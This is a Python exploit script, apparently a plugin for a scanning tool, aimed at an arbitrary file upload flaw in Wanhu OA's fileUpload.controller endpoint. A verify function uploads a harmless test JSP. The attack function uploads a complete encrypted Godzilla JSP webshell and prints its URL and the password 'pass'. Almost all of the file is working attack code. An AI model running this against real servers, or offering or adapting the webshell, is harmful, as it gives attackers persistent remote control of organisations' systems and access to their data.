import requests
import re, time
import urllib, random, string

def verify(url):
    result = {
        'name': '万户OA fileUpload.controller 任意文件上传漏洞-2022',
        'vulnerable': False,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/DP9l_NU_11esoeQdHugPRw',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0',
    }
    vurl1 = urllib.parse.urljoin(url, "/defaultroot/upload/fileUpload.controller")
    verify_path = '/defaultroot/upload/html/{0}'
    data = '--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name="file"; filename="cmd.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n{0}\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--'.format(shell)
    try:
        rep = requests.post(vurl1, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('\d+\.jsp', rep.text):
            filename = re.findall('\d+\.jsp', rep.text)[0]
            verify_url = urllib.parse.urljoin(url,verify_path.format(filename))
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
        return result
    except:
        return result

def attack(url):
    shell = '''<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>'''
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0',
    }
    vurl1 = urllib.parse.urljoin(url, "/defaultroot/upload/fileUpload.controller")
    verify_path = '/defaultroot/upload/html/{0}'
    data = '--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name="file"; filename="cmd.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n{0}\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--'.format(shell)
    print("[+] exploit loading ......")
    time.sleep(2)
    try:
        print("[+] 开始上传哥斯拉webshell")
        rep = requests.post(vurl1, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('\d+\.jsp', rep.text):
            print("[+] 上传完成，正在检测是否存在?")
            filename = re.findall('\d+\.jsp', rep.text)[0]
            print("[+] 成功获取文件名: ", filename)
            verify_url = urllib.parse.urljoin(url,verify_path.format(filename))
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if verify_rep.status_code == 200:
                print("[*] 上传成功, webshell(哥斯拉): ", verify_url)
                print("[*] 密码: pass   加密器: JAVA_AES_RAW")
                return True
        return False
    except:
        return False